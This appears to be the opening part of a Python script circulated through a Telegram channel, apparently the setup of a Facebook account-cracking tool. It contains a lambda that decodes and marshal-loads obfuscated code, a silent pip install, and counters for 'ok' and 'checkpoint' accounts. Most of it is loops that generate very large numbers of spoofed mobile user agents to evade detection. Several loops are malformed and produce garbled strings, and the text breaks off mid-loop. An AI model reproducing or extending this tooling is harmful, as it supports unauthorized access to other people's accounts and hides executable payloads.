
# — — — — — — — — — — — — —
# Tool Made By @i6iii1
# Encoding: Pycdc 3.11
# Decode By @i6iii1
# Channel @mafiams1
# — — — — — — — — — — — — —


import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));
import os,sys,json,uuid,string,random,requests
from concurrent.futures import ThreadPoolExecutor
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';bblack="\033[1;31m"; M="\033[1;31m";H="\033[1;33m";byellow="\033[1;33m";bblue="\033[1;34m";P="\033[1;35m";C="\033[1;36m";B="\033[1;37m";G="\033[1;32m";R="\033[1;31m";AA="\033[1;32m";BB="\033[1;31m";CC="\033[1;36m";X='\033[1;31m';XX="\x1b[38;5;196m";GGG="\x1b[38;5;214m";ccrush="\033[1;30m";R="\033[1;31m";XX="\x1b[38;5;196m";
#---------#
import os,requests,json,time,re,random,sys,uuid,string,subprocess,zlib,platform
import marshal
import os,base64
from os import system as clr
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    os.system('pip install requests bs4 futures==2 > /dev/null')
#-----------------------------------------------------#
W = '\033[97;1m';B = '\033[96;1m';P = '\033[95;1m'; R = '\033[91;1m' ;G = '\033[92;1m';R = '\033[31;1m';RED = '\x1b[38;5;46m';G = '\033[32;1m';Y = '\033[33;1m';B = '\033[34;1m';M = '\033[35;1m';C = '\033[36;1m';LR = '\033[91;1m';LG = '\033[92;1m';LY = '\033[93;1m';LB = '\033[94;1m';LM = '\033[95;1m';LC = '\033[96;1m'
dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
loop = 0
oks = []
cps = [] 
user = []
oks = []
cps = [] 
ugen=[]
ugen2=[]
for xd in range(10000):  
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='SM-G960N Build/QP1A.190711.020; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
  ugen.append(uakuh)
for xd in range(10000): 
  aa='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['SM-J610F'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(80,106)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
for xd in range(10000):   
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['LE2113'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
for xd in range(10000): 
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['6','7','8','9','10','11','12'])
  c=(['en-us; RMX1925 Build/QKQ1.200209.002)'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(73,100)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 HeyTapBrowser/45.7.0.0'
  uakuh=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
  ugen.append(uakuh)
for xd in range(5000):   
   aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
   b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
   c=' en-us; GT-','Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36'
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
   h=random.randrange(73,100)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
   uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
   ugen.append(uaku2)
for agent in range(10000):   
	aa='Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)

for xd in range(10000):
   a='Mozilla/5.0 (Symbian/3; Series60/','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
   b=random.randrange(1, 9)
   c=random.randrange(1, 9)
   d='Nokia','Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36'
   e=random.randrange(100, 9999)
   #f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
   g=random.randrange(1, 9)
   h=random.randrange(1, 4)
   i=random.randrange(1, 4)
   j=random.randrange(1, 4)
   k='Mobile Safari/535.1','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
   uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
   ugen.append(uaku)

   aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
   b=random.choice(['6','7','8','9','10','11','12'])
   c=' en-us; GT-'
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
   h=random.randrange(73,100)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)

for agenku in range(10000):
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['M2006C3MII'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
for xd in range(10000):  
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='Redmi Note 9 Pro Build/QKQ1.191215.002; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
  ugen.append(uakuh)
for xd in range(10000): 
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['801SO'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 OPR/63.0.2254.62069'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
for xd in range(10000):   
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='SM-G960N Build/QP1A.190711.020; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
  ugen.append(uakuh)
for xd in range(10000): 
  aa='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['SM-J610F'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(80,106)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 12;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['2201116PG'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/107.0.0.0 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 11;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['Infinix X688B'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/107.0.0.0 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Windows NT 10.0;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['Win64; x64'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/107.0.0.0 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000):    
   aa='Mozilla/5.0 (Series40;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['Nokia2000/11.95;'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='S40OviBrowser/2.2.0.0.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 8.1.0;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['ASUS_Z01QD'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/72.0.3626.76 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000):	
   aa='Mozilla/5.0 (Linux; Android 9;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['PortalTV'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/85.0.4183.120 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 9;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['PortalTV Build/PKQ1.190408.001; wv'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
